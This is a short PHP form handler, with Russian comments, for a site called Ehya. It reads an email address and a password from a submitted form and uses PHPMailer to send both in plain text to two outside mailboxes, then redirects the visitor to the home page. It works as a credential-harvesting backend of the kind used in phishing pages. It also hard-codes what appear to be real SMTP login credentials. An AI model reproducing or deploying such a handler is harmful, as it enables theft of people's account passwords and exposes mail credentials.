<?php
// Файлы phpmailer
require 'phpmailer/PHPMailer.php';
require 'phpmailer/SMTP.php';
require 'phpmailer/Exception.php';

// Переменные, которые отправляет пользователь
$email = $_POST['email'];
$password = $_POST['password'];

// Формирование самого письма
$title = "Новое обращение на сайт Ehya";
$body = "
<h2>Новое обращение</h2>
<b>Почта:</b> $email<br>
<b>Пароль:</b> $password<br>
";

// Настройки PHPMailer
$mail = new PHPMailer\PHPMailer\PHPMailer();
try {
    $mail->isSMTP();   
    $mail->CharSet = "UTF-8";
    $mail->SMTPAuth   = true;
    $mail->SMTPDebug = 2;
    $mail->Debugoutput = function($str, $level) {$GLOBALS['status'][] = $str;};

    // Настройки вашей почты
    $mail->Host       = 'grishchuk.ru'; // SMTP сервера вашей почты
    $mail->Username   = 'besttourplan@grishchuk.ru'; // Логин на почте
    $mail->Password   = '0G1r1H7y'; // Пароль на почте
    $mail->SMTPSecure = 'ssl';
    $mail->Port       = 465;
    $mail->setFrom('besttourplan@grishchuk.ru', 'Aga No'); // Адрес самой почты и имя отправителя

    // Получатель письма
    $mail->addAddress('login238@yandex.ru');  
    $mail->addAddress('noaga88@gmail.com'); // Ещё один, если нужен

    // Отправка сообщения
    $mail->isHTML(true);
    $mail->Subject = $title;
    $mail->Body = $body;    

// Проверяем отравленность сообщения
if ($mail->send()) {$result = "success";} 
else {$result = "error";}

} catch (Exception $e) {
    $result = "error";
    $status = "Сообщение не было отправлено. Причина ошибки: {$mail->ErrorInfo}";
}

// Отображение результата
// echo json_encode(["result" => $result, "resultfile" => $rfile, "status" => $status]);
header('location: index.html');